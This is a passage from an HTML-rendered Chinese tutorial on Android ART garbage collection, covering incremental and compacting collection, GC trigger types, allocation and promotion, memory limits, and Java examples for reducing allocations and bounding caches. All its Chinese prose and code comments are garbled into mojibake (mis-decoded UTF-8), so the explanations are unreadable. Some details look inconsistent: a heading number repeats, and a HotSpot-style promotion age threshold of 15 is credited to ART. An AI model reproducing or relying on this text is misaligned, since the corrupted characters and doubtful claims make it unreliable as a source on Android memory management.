å›æ”¶åï¼ˆ<span class="hljs-selector-tag">To</span>åŒºï¼‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span>
 å­˜æ´»   å­˜æ´»
</code></pre>
<h5 data-id="heading-22">3.3.4 å¢é‡å›æ”¶ï¼ˆä¼˜åŒ–ç‰¹æ€§ï¼‰</h5>
<p><strong>æŠŠå¤§é‡çš„å›æ”¶å·¥ä½œåˆ†æˆå°ä»½</strong>
<strong>åˆ†æ‰¹æ‰§è¡Œï¼Œæ¯æ¬¡åªåšä¸€ç‚¹ç‚¹</strong>
<strong>é¿å…ä¸€æ¬¡æ€§å¡é¡¿å¤ªä¹…</strong></p>
<p><strong>å¢é‡å›æ”¶çš„ä¼˜åŠ¿ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">ä¼ ç»Ÿå›æ”¶ï¼š
<span class="hljs-selector-attr">[ä¸€æ¬¡æ€§å›æ”¶æ‰€æœ‰å¯¹è±¡]</span>
æš‚åœæ—¶é—´ï¼š<span class="hljs-number">50ms</span>
ç”¨æˆ·æ„Ÿè§‰ï¼šæ˜æ˜¾å¡é¡¿

å¢é‡å›æ”¶ï¼š
<span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span><span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span><span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span>
æ¯æ¬¡æš‚åœï¼š<span class="hljs-number">5ms</span>
ç”¨æˆ·æ„Ÿè§‰ï¼šå‡ ä¹æ„Ÿè§‰ä¸åˆ°
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·æ“ä½œæ—¶ï¼ŒGCä¸ä¼šä¸€æ¬¡æ€§æš‚åœå¤ªä¹…</span>
<span class="hljs-comment">// è€Œæ˜¯åˆ†æˆå¤šæ¬¡ï¼Œæ¯æ¬¡æš‚åœå¾ˆçŸ­æ—¶é—´</span>
button.setOnClickListener(v -&gt; {
    <span class="hljs-comment">// å³ä½¿æ­¤æ—¶GCï¼Œä¹Ÿä¸ä¼šæ˜æ˜¾å¡é¡¿</span>
    <span class="hljs-comment">// å› ä¸ºGCæ˜¯å¢é‡æ‰§è¡Œçš„</span>
});
</code></pre>
<h5 data-id="heading-23">3.3.5 å‹ç¼©å›æ”¶ï¼ˆä¼˜åŒ–ç‰¹æ€§ï¼‰</h5>
<p><strong>å›æ”¶åæ•´ç†å†…å­˜</strong>
<strong>æŠŠåˆ†æ•£çš„å†…å­˜ç¢ç‰‡åˆå¹¶æˆè¿ç»­ç©ºé—´</strong>
<strong>é¿å…å†…å­˜æµªè´¹ï¼Œæ–¹ä¾¿åç»­åˆ†é…</strong></p>
<p><strong>å‹ç¼©å›æ”¶çš„ä¼˜åŠ¿ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">å‹ç¼©å‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span>
å†…å­˜ç¢ç‰‡å¤šï¼Œåˆ†é…æ•ˆç‡ä½

å‹ç¼©åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
å†…å­˜è¿ç»­ï¼Œåˆ†é…æ•ˆç‡é«˜
</code></pre>
<p><strong>æ€»ç»“ï¼šè¿™äº›éƒ½æ˜¯"å¹¶å‘å¤åˆ¶æ”¶é›†å™¨"çš„ç‰¹æ€§ï¼Œå®ƒä»¬åŒæ—¶å‘æŒ¥ä½œç”¨ï¼Œè®©å›æ”¶æ›´é«˜æ•ˆã€æ›´å°‘å¡é¡¿</strong></p>
<h4 data-id="heading-24">3.4 Android GCçš„è®¾è®¡ç›®æ ‡</h4>
<p><strong>ä½å»¶è¿Ÿ</strong>ï¼šå°½é‡å‡å°‘GCå¯¼è‡´çš„å¡é¡¿
<strong>å¹¶å‘å¤„ç†</strong>ï¼šå°½é‡åœ¨åå°æ‰§è¡Œï¼Œä¸é˜»å¡ä¸»çº¿ç¨‹
<strong>é€‚åˆäº¤äº’å¼åº”ç”¨</strong>ï¼šä¼˜åŒ–ç”¨æˆ·æ»‘åŠ¨ã€ç‚¹å‡»ç­‰æ“ä½œçš„æµç•…åº¦</p>
<h4 data-id="heading-25">3.4 ART GCçš„è§¦å‘æ¡ä»¶ï¼ˆä»€ä¹ˆæ—¶å€™ä¼šè§¦å‘åƒåœ¾å›æ”¶ï¼‰</h4>
<p><strong>è¯´æ˜ï¼šè§¦å‘æ¡ä»¶å°±æ˜¯"ä»€ä¹ˆæƒ…å†µä¸‹ç³»ç»Ÿä¼šè‡ªåŠ¨å¼€å§‹æ¸…ç†åƒåœ¾"</strong></p>
<h4 data-id="heading-26">3.4.1 Partial GCï¼ˆéƒ¨åˆ†å›æ”¶ï¼‰çš„è§¦å‘æ¡ä»¶</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™è§¦å‘ï¼šå¹´è½»ä»£ç©ºé—´æ»¡äº†</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ul>
<li>ä½ åˆ›å»ºäº†å¾ˆå¤šæ–°å¯¹è±¡ï¼Œå¹´è½»ä»£å†…å­˜å¿«ç”¨å®Œäº†</li>
<li>ç³»ç»Ÿæ£€æµ‹åˆ°å¹´è½»ä»£ç©ºé—´ä¸è¶³ï¼Œè‡ªåŠ¨è§¦å‘Partial GC</li>
<li>åªæ¸…ç†å¹´è½»ä»£ï¼Œä¸æ¸…ç†è€å¹´ä»£</li>
</ul>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>è§¦å‘å¿«ï¼Œæ‰§è¡Œå¿«</li>
<li>æš‚åœæ—¶é—´çŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
<li>å¯¹åº”ç”¨å½±å“å°ï¼Œç”¨æˆ·åŸºæœ¬æ„Ÿè§‰ä¸åˆ°</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createManyObjects</span><span class="hljs-params">()</span> {
    List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// åˆ›å»ºå¤§é‡å¯¹è±¡</span>
        <span class="hljs-comment">// å½“å¹´è½»ä»£å¿«æ»¡æ—¶ï¼Œè§¦å‘Partial GC</span>
    }
}
</code></pre>
<h4 data-id="heading-27">3.4.2 Full GCï¼ˆå®Œå…¨å›æ”¶ï¼‰çš„è§¦å‘æ¡ä»¶</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™è§¦å‘ï¼šæ•´ä¸ªå †å†…å­˜ä¸è¶³</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ul>
<li>è€å¹´ä»£ç©ºé—´æ»¡äº†</li>
<li>å †å†…å­˜æ•´ä½“ä¸è¶³ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡</li>
<li>æ˜¾å¼è°ƒç”¨System.gc()ï¼ˆAndroidä¸æ¨èï¼Œå› ä¸ºä¼šå¼ºåˆ¶è§¦å‘Full GCï¼‰</li>
</ul>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æ‰§è¡Œæ…¢ï¼Œæš‚åœæ—¶é—´é•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
<li>ä¼šæ¸…ç†æ•´ä¸ªå †ï¼ˆå¹´è½»ä»£+è€å¹´ä»£ï¼‰</li>
<li>å¯èƒ½å¯¼è‡´åº”ç”¨å¡é¡¿ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸æ¨èï¼šä¼šå¼ºåˆ¶è§¦å‘Full GC</span>
System.gc();  <span class="hljs-comment">// Androidä¸æ¨èä½¿ç”¨</span>

<span class="hljs-comment">// åº”è¯¥è®©ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</span>
<span class="hljs-comment">// é€šè¿‡ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘Full GCçš„è§¦å‘</span>
</code></pre>
<h4 data-id="heading-28">3.4.3 Sticky GCï¼ˆç²˜æ€§å›æ”¶ï¼‰çš„è§¦å‘æ¡ä»¶</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™è§¦å‘ï¼šé¢‘ç¹åˆ›å»ºçŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡æ—¶</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ul>
<li>åˆ—è¡¨å¿«é€Ÿæ»‘åŠ¨æ—¶ï¼ˆRecyclerViewæ»šåŠ¨ï¼‰</li>
<li>åŠ¨ç”»æ’­æ”¾æ—¶ï¼ˆä¸æ–­åˆ›å»ºä¸´æ—¶å¯¹è±¡ï¼‰</li>
<li>UIæ¸²æŸ“æ—¶ï¼ˆé¢‘ç¹åˆ›å»ºViewç›¸å…³å¯¹è±¡ï¼‰</li>
</ul>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>åªæ¸…ç†åˆšåˆšåˆ›å»ºçš„æ–°å¯¹è±¡</li>
<li>éå¸¸å¿«é€Ÿï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
<li>ä¸“é—¨ä¼˜åŒ–é¢‘ç¹åˆ†é…å¯¹è±¡çš„åœºæ™¯</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">recyclerView.addOnScrollListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrolled</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-type">int</span> dx, <span class="hljs-type">int</span> dy)</span> {
        <span class="hljs-comment">// æ»‘åŠ¨æ—¶é¢‘ç¹åˆ›å»ºå¯¹è±¡</span>
        <span class="hljs-comment">// è§¦å‘Sticky GCï¼Œå¿«é€Ÿæ¸…ç†</span>
    }
});
</code></pre>
<h4 data-id="heading-29">3.4.4 å¦‚ä½•æŸ¥çœ‹å’Œé¢„é˜²GC</h4>
<p><strong>æŸ¥çœ‹GCæ—¥å¿—ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨logcatæŸ¥çœ‹GCäº‹ä»¶</li>
<li>ä½¿ç”¨Android Studio Profilerç›‘æ§GC</li>
<li>ä½¿ç”¨Systraceåˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
</ul>
<p><strong>é¢„é˜²é¢‘ç¹GCï¼š</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ†é…ï¼ˆå¤ç”¨å¯¹è±¡ã€ä½¿ç”¨å¯¹è±¡æ± ï¼‰</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜ï¼ˆåŠæ—¶æ¸…ç†ä¸éœ€è¦çš„ç¼“å­˜ï¼‰</li>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ˆæ­£ç¡®é‡Šæ”¾èµ„æºï¼‰</li>
</ul>
<h4 data-id="heading-30">3.5 ARTå†…å­˜åˆ†é…ç­–ç•¥ï¼ˆå¯¹è±¡åœ¨å†…å­˜ä¸­æ˜¯æ€ä¹ˆåˆ†é…çš„ï¼‰</h4>
<p><strong>è¯´æ˜ï¼šåˆ†é…ç­–ç•¥å°±æ˜¯"æ–°åˆ›å»ºçš„å¯¹è±¡æ”¾åœ¨å†…å­˜çš„å“ªä¸ªä½ç½®"</strong></p>
<h4 data-id="heading-31">3.5.1 æ–°å¯¹è±¡ä¼˜å…ˆåœ¨å¹´è½»ä»£åˆ†é…</h4>
<p><strong>åˆ†é…è§„åˆ™ï¼šæ–°åˆ›å»ºçš„å¯¹è±¡å…ˆæ”¾åœ¨å¹´è½»ä»£</strong></p>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼š</strong></p>
<ul>
<li>å¤§éƒ¨åˆ†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­ï¼Œå¾ˆå¿«å°±ä¼šè¢«å›æ”¶</li>
<li>æ”¾åœ¨å¹´è½»ä»£ï¼Œå›æ”¶å¿«ï¼Œæ•ˆç‡é«˜</li>
</ul>
<p><strong>å…·ä½“æµç¨‹ï¼š</strong></p>
<ul>
<li>ä½ å†™ä»£ç ï¼š<code>Object obj = new Object()</code></li>
<li>ç³»ç»Ÿåˆ†é…ï¼šå¯¹è±¡æ”¾åœ¨å¹´è½»ä»£</li>
<li>å¦‚æœå¹´è½»ä»£æ»¡äº†ï¼šè§¦å‘Partial GCï¼Œæ¸…ç†åå†åˆ†é…</li>
</ul>
<p><strong>åˆ†é…å¤±è´¥æ€ä¹ˆåŠï¼š</strong></p>
<ul>
<li>å¦‚æœå¹´è½»ä»£æ»¡äº†ï¼Œå…ˆè§¦å‘Partial GC</li>
<li>GCåå¦‚æœè¿˜æ˜¯ä¸å¤Ÿï¼Œå¯èƒ½è§¦å‘Full GC</li>
<li>å¦‚æœFull GCåè¿˜æ˜¯ä¸å¤Ÿï¼Œå¯èƒ½æŠ›å‡ºOutOfMemoryError</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">allocateObjects</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// æ–°å¯¹è±¡åˆ†é…åœ¨å¹´è½»ä»£</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¹´è½»ä»£</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¹´è½»ä»£</span>
    
    <span class="hljs-comment">// å¦‚æœå¹´è½»ä»£æ»¡äº†ï¼Œè§¦å‘Partial GC</span>
    <span class="hljs-comment">// GCåç»§ç»­åˆ†é…</span>
}
</code></pre>
<h4 data-id="heading-32">3.5.2 å¤§å¯¹è±¡çš„å¤„ç†</h4>
<p><strong>ä»€ä¹ˆæ˜¯å¤§å¯¹è±¡ï¼š</strong></p>
<ul>
<li>å ç”¨å†…å­˜å¾ˆå¤§çš„å¯¹è±¡ï¼ˆæ¯”å¦‚å¤§å›¾ç‰‡ã€å¤§æ•°ç»„ï¼‰</li>
<li>Androidåœºæ™¯ï¼šBitmapã€å¤§æ•°ç»„ç­‰</li>
</ul>
<p><strong>å¤§å¯¹è±¡æ€ä¹ˆåˆ†é…ï¼š</strong></p>
<ul>
<li>å¦‚æœå¯¹è±¡å¤ªå¤§ï¼Œå¯èƒ½ç›´æ¥æ”¾åœ¨è€å¹´ä»£</li>
<li>é¿å…åœ¨å¹´è½»ä»£ä¹‹é—´å¤åˆ¶å¤§å¯¹è±¡ï¼ˆå¤åˆ¶æˆæœ¬é«˜ï¼‰</li>
</ul>
<p><strong>å¤§å¯¹è±¡å¯¹GCçš„å½±å“ï¼š</strong></p>
<ul>
<li>å¤§å¯¹è±¡å ç”¨å†…å­˜å¤šï¼Œå®¹æ˜“å¯¼è‡´å†…å­˜ä¸è¶³</li>
<li>å¤§å¯¹è±¡å›æ”¶æ…¢ï¼Œå¯èƒ½å½±å“GCæ€§èƒ½</li>
<li>å»ºè®®ï¼šåŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼Œé¿å…å†…å­˜å‹åŠ›</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¤§å¯¹è±¡å¯èƒ½ç›´æ¥è¿›å…¥è€å¹´ä»£</span>
<span class="hljs-type">Bitmap</span> <span class="hljs-variable">largeBitmap</span> <span class="hljs-operator">=</span> Bitmap.createBitmap(<span class="hljs-number">4000</span>, <span class="hljs-number">4000</span>, Bitmap.Config.ARGB_8888);
<span class="hljs-comment">// è¿™ä¸ªBitmapå¾ˆå¤§ï¼Œå¯èƒ½ç›´æ¥æ”¾åœ¨è€å¹´ä»£</span>

<span class="hljs-comment">// å»ºè®®ï¼šåŠæ—¶é‡Šæ”¾</span>
largeBitmap.recycle();
largeBitmap = <span class="hljs-literal">null</span>;
</code></pre>
<h4 data-id="heading-33">3.5.3 é•¿æœŸå­˜æ´»çš„å¯¹è±¡æ™‹å‡åˆ°è€å¹´ä»£</h4>
<p><strong>æ™‹å‡è§„åˆ™ï¼šå¯¹è±¡åœ¨å¹´è½»ä»£å­˜æ´»è¶³å¤Ÿä¹…ï¼Œå°±ç§»åˆ°è€å¹´ä»£</strong></p>
<p><strong>å¹´é¾„è®¡æ•°æœºåˆ¶ï¼š</strong></p>
<ul>
<li>æ¯æ¬¡Partial GCåï¼Œå­˜æ´»çš„å¯¹è±¡å¹´é¾„+1</li>
<li>å¹´é¾„è¾¾åˆ°é˜ˆå€¼ï¼ˆæ¯”å¦‚15æ¬¡ï¼‰ï¼Œå°±æ™‹å‡åˆ°è€å¹´ä»£</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦æ™‹å‡ï¼š</strong></p>
<ul>
<li>é•¿æœŸå­˜æ´»çš„å¯¹è±¡æ”¾åœ¨å¹´è½»ä»£ï¼Œæ¯æ¬¡GCéƒ½è¦æ£€æŸ¥ï¼Œæµªè´¹æ•ˆç‡</li>
<li>ç§»åˆ°è€å¹´ä»£ï¼Œå‡å°‘æ£€æŸ¥æ¬¡æ•°ï¼Œæé«˜æ•ˆç‡</li>
</ul>
<p><strong>æ™‹å‡æ—¶æœºï¼š</strong></p>
<ul>
<li>å¯¹è±¡åœ¨å¹´è½»ä»£ç»å†å¤šæ¬¡GCåä»å­˜æ´»</li>
<li>å¹´é¾„è¾¾åˆ°é˜ˆå€¼æ—¶è‡ªåŠ¨æ™‹å‡</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongLivedObject</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(Object obj)</span> {
        cache.add(obj);  <span class="hljs-comment">// è¿™ä¸ªå¯¹è±¡è¢«cacheå¼•ç”¨ï¼Œé•¿æœŸå­˜æ´»</span>
        <span class="hljs-comment">// ç»è¿‡å¤šæ¬¡GCåï¼Œä¼šæ™‹å‡åˆ°è€å¹´ä»£</span>
    }
}
</code></pre>
<h4 data-id="heading-34">3.5.4 Androidå†…å­˜é™åˆ¶</h4>
<p><strong>ä¸åŒè®¾å¤‡çš„å †å†…å­˜é™åˆ¶ï¼š</strong></p>
<ul>
<li>ä¸åŒAndroidè®¾å¤‡æœ‰ä¸åŒçš„å †å†…å­˜ä¸Šé™</li>
<li>ä½ç«¯è®¾å¤‡å¯èƒ½åªæœ‰å‡ åMB</li>
<li>é«˜ç«¯è®¾å¤‡å¯èƒ½æœ‰å‡ ç™¾MBåˆ°å‡ GB</li>
</ul>
<p><strong>ä½å†…å­˜è®¾å¤‡çš„å¤„ç†ï¼š</strong></p>
<ul>
<li>ç³»ç»Ÿä¼šé™åˆ¶æ¯ä¸ªåº”ç”¨çš„å†…å­˜ä½¿ç”¨</li>
<li>å†…å­˜ä¸è¶³æ—¶ï¼Œç³»ç»Ÿå¯èƒ½æ€æ­»åå°åº”ç”¨</li>
<li>ä½ çš„åº”ç”¨å¯èƒ½æ”¶åˆ°onLowMemory()å›è°ƒ</li>
</ul>
<p><strong>å†…å­˜ä¼˜åŒ–çš„é‡è¦æ€§ï¼š</strong></p>
<ul>
<li>Androidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li>å†…å­˜å ç”¨è¿‡é«˜ï¼Œå¯èƒ½å¯¼è‡´åº”ç”¨è¢«ç³»ç»Ÿæ€æ­»</li>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼Œæå‡åº”ç”¨æ€§èƒ½å’Œç¨³å®šæ€§</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLowMemory</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onLowMemory();
        <span class="hljs-comment">// ç³»ç»Ÿå†…å­˜ä¸è¶³æ—¶è°ƒç”¨</span>
        <span class="hljs-comment">// åº”è¯¥é‡Šæ”¾ä¸å¿…è¦çš„èµ„æº</span>
        clearCache();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearCache</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ¸…ç†ç¼“å­˜ï¼Œé‡Šæ”¾å†…å­˜</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-35">ç¬¬å››éƒ¨åˆ†ï¼šAndroid GCä¼˜åŒ–ä¸å®è·µ</h2>
<h3 data-id="heading-36">4. Android GCä¼˜åŒ–ï¼ˆå¦‚ä½•å‡å°‘GCï¼Œæå‡æ€§èƒ½ï¼‰</h3>
<h4 data-id="heading-37">4.1 Android GCä¼˜åŒ–çš„ç›®æ ‡</h4>
<p><strong>é™ä½GCæš‚åœæ—¶é—´</strong>ï¼šæœ€é‡è¦ï¼Œå‡å°‘å¡é¡¿
<strong>å‡å°‘å†…å­˜å ç”¨</strong>ï¼šé™ä½å†…å­˜å‹åŠ›
<strong>æå‡åº”ç”¨æµç•…åº¦</strong>ï¼šä¼˜åŒ–ç”¨æˆ·ä½“éªŒ
<strong>é¿å…ANR</strong>ï¼šé˜²æ­¢åº”ç”¨æ— å“åº”</p>
<h4 data-id="heading-38">4.2 Androidå¼€å‘ä¸­çš„GCä¼˜åŒ–ç­–ç•¥</h4>
<h5 data-id="heading-39">4.2.1 å‡å°‘å¯¹è±¡åˆ†é…</h5>
<p><strong>å¯¹è±¡å¤ç”¨ï¼ˆä½¿ç”¨å¯¹è±¡æ± ï¼Œé¿å…é¢‘ç¹åˆ›å»ºï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šé¢‘ç¹åˆ›å»ºå¯¹è±¡</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šå¤ç”¨å¯¹è±¡</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-comment">// å¤ç”¨åŒä¸€ä¸ªå¯¹è±¡</span>
}
</code></pre>
<p><strong>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»ºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå­—ç¬¦ä¸²æ‹¼æ¥</span>
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    result += i;  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°Stringå¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨StringBuilder</span>
<span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    sb.append(i);  <span class="hljs-comment">// å¤ç”¨StringBuilder</span>
}
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> sb.toString();
</code></pre>
<p><strong>ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šä½¿ç”¨åŒ…è£…ç±»å‹</span>
List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(i));  <span class="hljs-comment">// åˆ›å»ºIntegerå¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨åŸºæœ¬ç±»å‹æ•°ç»„</span>
<span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    array[i] = i;  <span class="hljs-comment">// ä¸åˆ›å»ºå¯¹è±¡</span>
}
</code></pre>
<h5 data-id="heading-40">4.2.2 åˆç†ä½¿ç”¨ç¼“å­˜</h5>
<p><strong>é¿å…å†…å­˜æ³„æ¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæ— é™åˆ¶ç¼“å­˜</span>
<span class="hljs-keyword">private</span> Map&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(String key, Bitmap bitmap)</span> {
    cache.put(key, bitmap);  <span class="hljs-comment">// å¯èƒ½æ— é™å¢é•¿</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨LruCache</span>
<span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(String key, Bitmap bitmap)</span> {
    cache.put(key, bitmap);  <span class="hljs-comment">// è‡ªåŠ¨é™åˆ¶å¤§å°</span>
}
</code></pre>
<p><strong>åŠæ—¶æ¸…ç†ä¸å†ä½¿ç”¨çš„ç¼“å­˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-comment">// æ¸…ç†ç¼“å­˜</span>
    cache.clear();
}
</code></pre>
